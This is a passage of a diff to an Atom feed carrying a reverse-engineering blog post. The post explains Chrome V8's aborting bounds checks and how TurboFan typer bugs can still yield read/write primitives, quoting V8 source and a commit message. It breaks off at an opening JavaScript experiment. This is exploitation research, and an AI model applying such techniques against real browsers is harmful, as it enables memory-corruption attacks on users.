@@ -1,5 +1,502 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>Diary of a reverse-engineer - Jeremy "__x86" Fetiveau</title><link href="/" rel="alternate"></link><link href="/feeds/author.jeremy-__x86-fetiveau.atom.xml" rel="self"></link><id>/</id><updated>2019-01-28T08:00:00-08:00</updated><entry><title>Introduction to TurboFan</title><link href="/blog/2019/01/28/introduction-to-turbofan/" rel="alternate"></link><published>2019-01-28T08:00:00-08:00</published><updated>2019-01-28T08:00:00-08:00</updated><author><name>Jeremy "__x86" Fetiveau</name></author><id>tag:None,2019-01-28:/blog/2019/01/28/introduction-to-turbofan/</id><summary type="html">&lt;h1 id="introduction"&gt;Introduction&lt;/h1&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Diary of a reverse-engineer - Jeremy "__x86" Fetiveau</title><link href="https://doar-e.github.io/" rel="alternate"></link><link href="https://doar-e.github.io%5Cfeeds/author.jeremy-__x86-fetiveau.atom.xml" rel="self"></link><id>https://doar-e.github.io/</id><updated>2019-05-09T08:00:00-07:00</updated><entry><title>Circumventing Chrome's hardening of typer bugs</title><link href="https://doar-e.github.io%5Cblog/2019/05/09/circumventing-chromes-hardening-of-typer-bugs/" rel="alternate"></link><published>2019-05-09T08:00:00-07:00</published><updated>2019-05-09T08:00:00-07:00</updated><author><name>Jeremy "__x86" Fetiveau</name></author><id>tag:doar-e.github.io\blog,2019-05-09:/2019/05/09/circumventing-chromes-hardening-of-typer-bugs/</id><summary type="html">&lt;h1 id="introduction"&gt;Introduction&lt;/h1&gt;
+&lt;p&gt;Some &lt;a href="http://eternalsakura13.com/2018/11/19/justintime/"&gt;recent&lt;/a&gt; &lt;a href="https://abiondo.me/2019/01/02/exploiting-math-expm1-v8"&gt;Chrome&lt;/a&gt; &lt;a href="https://www.jaybosamiya.com/blog/2019/01/02/krautflare/"&gt;exploits&lt;/a&gt; were taking advantage of &lt;a href="https://en.wikipedia.org/wiki/Bounds-checking_elimination"&gt;Bounds-Check-Elimination&lt;/a&gt; in order to get a R/W primitive from a TurboFan's typer bug (a bug that incorrectly computes type information during code optimization). Indeed during the simplified lowering phase when visiting a CheckBounds node if the engine can guarantee that …&lt;/p&gt;</summary><content type="html">&lt;h1 id="introduction"&gt;Introduction&lt;/h1&gt;
+&lt;p&gt;Some &lt;a href="http://eternalsakura13.com/2018/11/19/justintime/"&gt;recent&lt;/a&gt; &lt;a href="https://abiondo.me/2019/01/02/exploiting-math-expm1-v8"&gt;Chrome&lt;/a&gt; &lt;a href="https://www.jaybosamiya.com/blog/2019/01/02/krautflare/"&gt;exploits&lt;/a&gt; were taking advantage of &lt;a href="https://en.wikipedia.org/wiki/Bounds-checking_elimination"&gt;Bounds-Check-Elimination&lt;/a&gt; in order to get a R/W primitive from a TurboFan's typer bug (a bug that incorrectly computes type information during code optimization). Indeed during the simplified lowering phase when visiting a CheckBounds node if the engine can guarantee that the used index is always in-bounds then the CheckBounds is considered redundant and thus removed. I explained this &lt;a href="https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/#simplified-lowering"&gt;in my previous article&lt;/a&gt;. 
+Recently, TurboFan introduced a change that adds  &lt;a href="https://bugs.chromium.org/p/v8/issues/detail?id=8806"&gt;aborting bound checks&lt;/a&gt;. It means that CheckBounds will never get removed during simplified lowering. As mentioned by &lt;a href="https://googleprojectzero.blogspot.com/2019/04/virtually-unlimited-memory-escaping.html"&gt;Mark Brand's article on the Google Project Zero blog&lt;/a&gt; and &lt;a href="https://twitter.com/_tsuro"&gt;tsuro&lt;/a&gt; in his &lt;a href="https://docs.google.com/presentation/d/1DJcWByz11jLoQyNhmOvkZSrkgcVhllIlCHmal1tGzaw"&gt;zer0con talk&lt;/a&gt;, this could be problematic for exploitation.
+This short post discusses the hardening change and how to exploit typer bugs against latest versions of v8.
+As an example, I provide a &lt;a href="https://github.com/JeremyFetiveau/TurboFan-exploit-for-issue-762874"&gt;sample exploit that works on v8 7.5.0&lt;/a&gt;. &lt;/p&gt;
+
+
+&lt;div class="toc"&gt;&lt;span class="toctitle"&gt;Table of contents:&lt;/span&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="#introduction"&gt;Introduction&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#introduction-of-aborting-bound-checks"&gt;Introduction of aborting bound checks&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="#simplified-lowering"&gt;Simplified lowering&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#effect-linearization"&gt;Effect linearization&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#experimenting"&gt;Experimenting&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="#ordinary-behaviour"&gt;Ordinary behaviour&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="#typing-of-a-checkbounds"&gt;Typing of a CheckBounds&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#checkbounds-lowering-to-checkeduint32bounds"&gt;CheckBounds lowering to CheckedUint32Bounds&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#effect-linearization-checkeduint32bounds-to-uint32lessthan-with-unreachable"&gt;Effect Linearization :  CheckedUint32Bounds to Uint32LessThan with Unreachable&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#late-optimization-machineoperatorreducer-and-deadcodeelimination"&gt;Late optimization : MachineOperatorReducer and DeadCodeElimination&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#final-scheduling-no-more-bound-checking"&gt;Final scheduling : no more bound checking&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#generated-assembly-code"&gt;Generated assembly code&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#typer-bug"&gt;Typer bug&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="#native-context-specialization-of-an-element-access"&gt;Native context specialization of an element access&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#type-narrowing-and-constant-folding-of-numberlessthan"&gt;Type narrowing and constant folding of NumberLessThan&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#observing-the-generated-assembly"&gt;Observing the generated assembly&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#conclusion"&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#references"&gt;References&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/div&gt;
+&lt;h1 id="introduction-of-aborting-bound-checks"&gt;Introduction of aborting bound checks&lt;/h1&gt;
+&lt;p&gt;Aborting bounds checks have been introduced by the following commit: &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;commit 7bb6dc0e06fa158df508bc8997f0fce4e33512a5
+Author: Jaroslav Sevcik &amp;lt;jarin@chromium.org&amp;gt;
+Date:   Fri Feb 8 16:26:18 2019 +0100
+
+    [turbofan] Introduce aborting bounds checks.
+
+    Instead of eliminating bounds checks based on types, we introduce
+    an aborting bounds check that crashes rather than deopts.
+
+    Bug: v8:8806
+    Change-Id: Icbd9c4554b6ad20fe4135b8622590093679dac3f
+    Reviewed-on: https://chromium-review.googlesource.com/c/1460461
+    Commit-Queue: Jaroslav Sevcik &amp;lt;jarin@chromium.org&amp;gt;
+    Reviewed-by: Tobias Tebbi &amp;lt;tebbi@chromium.org&amp;gt;
+    Cr-Commit-Position: refs/heads/master@{#59467}
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2 id="simplified-lowering"&gt;Simplified lowering&lt;/h2&gt;
+&lt;p&gt;First, what has changed is the CheckBounds node visitor of &lt;code&gt;simplified-lowering.cc&lt;/code&gt;:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;  &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;VisitCheckBounds&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Node&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;node&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;SimplifiedLowering&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;lowering&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="n"&gt;CheckParameters&lt;/span&gt; &lt;span class="k"&gt;const&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;CheckParametersOf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;node&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;op&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;
+    &lt;span class="n"&gt;Type&lt;/span&gt; &lt;span class="k"&gt;const&lt;/span&gt; &lt;span class="n"&gt;index_type&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;TypeOf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;node&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;InputAt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
+    &lt;span class="n"&gt;Type&lt;/span&gt; &lt;span class="k"&gt;const&lt;/span&gt; &lt;span class="n"&gt;length_type&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;TypeOf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;node&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;InputAt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;length_type&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Is&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Type&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;Unsigned31&lt;/span&gt;&lt;span class="p"&gt;()))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+      &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;index_type&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Is&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Type&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;Integral32OrMinusZero&lt;/span&gt;&lt;span class="p"&gt;()))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+        &lt;span class="c1"&gt;// Map -0 to 0, and the values in the [-2^31,-1] range to the&lt;/span&gt;
+        &lt;span class="c1"&gt;// [2^31,2^32-1] range, which will be considered out-of-bounds&lt;/span&gt;
+        &lt;span class="c1"&gt;// as well, because the {length_type} is limited to Unsigned31.&lt;/span&gt;
+        &lt;span class="n"&gt;VisitBinop&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;node&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;UseInfo&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;TruncatingWord32&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt;
+                   &lt;span class="n"&gt;MachineRepresentation&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;kWord32&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;lower&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+          &lt;span class="n"&gt;CheckBoundsParameters&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;Mode&lt;/span&gt; &lt;span class="n"&gt;mode&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;
+              &lt;span class="n"&gt;CheckBoundsParameters&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;kDeoptOnOutOfBounds&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+          &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;lowering&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;poisoning_level_&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt;
+                  &lt;span class="n"&gt;PoisoningMitigationLevel&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;kDontPoison&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;
+              &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;index_type&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;IsNone&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="n"&gt;length_type&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;IsNone&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt;
+               &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;index_type&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Min&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;=&lt;/span&gt; &lt;span class="mf"&gt;0.0&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;
+                &lt;span class="n"&gt;index_type&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Max&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;length_type&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Min&lt;/span&gt;&lt;span class="p"&gt;())))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+            &lt;span class="c1"&gt;// The bounds check is redundant if we already know that&lt;/span&gt;
+            &lt;span class="c1"&gt;// the index is within the bounds of [0.0, length[.&lt;/span&gt;
+            &lt;span class="n"&gt;mode&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;CheckBoundsParameters&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;kAbortOnOutOfBounds&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;         &lt;span class="c1"&gt;// [1]&lt;/span&gt;
+          &lt;span class="p"&gt;}&lt;/span&gt;
+          &lt;span class="n"&gt;NodeProperties&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;ChangeOp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
+              &lt;span class="n"&gt;node&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;simplified&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;CheckedUint32Bounds&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;feedback&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="n"&gt;mode&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt; &lt;span class="c1"&gt;// [2]&lt;/span&gt;
+        &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="c1"&gt;// [...]&lt;/span&gt;
+  &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Before the commit, if condition [1] happens, the bound check &lt;a href="https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/#simplified-lowering"&gt;would have been removed&lt;/a&gt; using a call to &lt;code&gt;DeferReplacement(node, node-&amp;gt;InputAt(0));&lt;/code&gt;. Now, what happens instead is that the node gets lowered to a CheckedUint32Bounds with a AbortOnOutOfBounds mode [2].&lt;/p&gt;
+&lt;h2 id="effect-linearization"&gt;Effect linearization&lt;/h2&gt;
+&lt;p&gt;When the effect control linearizer (one of the optimization phase) kicks in, here is how the CheckedUint32Bounds gets lowered : &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;Node&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;EffectControlLinearizer&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;LowerCheckedUint32Bounds&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Node&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;node&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+                                                        &lt;span class="n"&gt;Node&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;frame_state&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+  &lt;span class="n"&gt;Node&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;index&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;node&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;InputAt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+  &lt;span class="n"&gt;Node&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;limit&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;node&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;InputAt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+  &lt;span class="k"&gt;const&lt;/span&gt; &lt;span class="n"&gt;CheckBoundsParameters&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;params&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;CheckBoundsParametersOf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;node&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;op&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;
+
+  &lt;span class="n"&gt;Node&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;check&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;__&lt;/span&gt; &lt;span class="n"&gt;Uint32LessThan&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;index&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;limit&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+  &lt;span class="k"&gt;switch&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;mode&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="n"&gt;CheckBoundsParameters&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="nl"&gt;kDeoptOnOutOfBounds&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+      &lt;span class="n"&gt;__&lt;/span&gt; &lt;span class="n"&gt;DeoptimizeIfNot&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;DeoptimizeReason&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;kOutOfBounds&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+                         &lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;check_parameters&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="n"&gt;feedback&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="n"&gt;check&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+                         &lt;span class="n"&gt;frame_state&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;IsSafetyCheck&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;kCriticalSafetyCheck&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+      &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="n"&gt;CheckBoundsParameters&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="nl"&gt;kAbortOnOutOfBounds&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+      &lt;span class="k"&gt;auto&lt;/span&gt; &lt;span class="n"&gt;if_abort&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;__&lt;/span&gt; &lt;span class="n"&gt;MakeDeferredLabel&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+      &lt;span class="k"&gt;auto&lt;/span&gt; &lt;span class="n"&gt;done&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;__&lt;/span&gt; &lt;span class="n"&gt;MakeLabel&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+
+      &lt;span class="n"&gt;__&lt;/span&gt; &lt;span class="nf"&gt;Branch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;check&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;done&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;if_abort&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+
+      &lt;span class="n"&gt;__&lt;/span&gt; &lt;span class="nf"&gt;Bind&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;if_abort&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+      &lt;span class="n"&gt;__&lt;/span&gt; &lt;span class="nf"&gt;Unreachable&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+      &lt;span class="n"&gt;__&lt;/span&gt; &lt;span class="nf"&gt;Goto&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;done&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+
+      &lt;span class="n"&gt;__&lt;/span&gt; &lt;span class="nf"&gt;Bind&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;done&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+      &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;
+  &lt;span class="p"&gt;}&lt;/span&gt;
+
+  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;index&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Long story short, the CheckedUint32Bounds is replaced by an Uint32LessThan node (plus the index and limit nodes). In case of an out-of-bounds there will be no deoptimization possible but instead we will reach an Unreachable node.&lt;/p&gt;
+&lt;p&gt;During instruction selection Unreachable nodes are replaced by breakpoint opcodes.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="n"&gt;InstructionSelector&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;VisitUnreachable&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Node&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;node&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+  &lt;span class="n"&gt;OperandGenerator&lt;/span&gt; &lt;span class="n"&gt;g&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+  &lt;span class="n"&gt;Emit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;kArchDebugBreak&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;g&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;NoOutput&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1 id="experimenting"&gt;Experimenting&lt;/h1&gt;
+&lt;h2 id="ordinary-behaviour"&gt;Ordinary behaviour&lt;/h2&gt;
+&lt;p&gt;Let's first experiment with some normal behaviour in order to get a grasp of what happens with bound checking. Consider the following code.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;opt_me&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+  &lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;arr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+  &lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;badly_typed&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+  &lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;idx&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;badly_typed&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;arr&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;idx&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
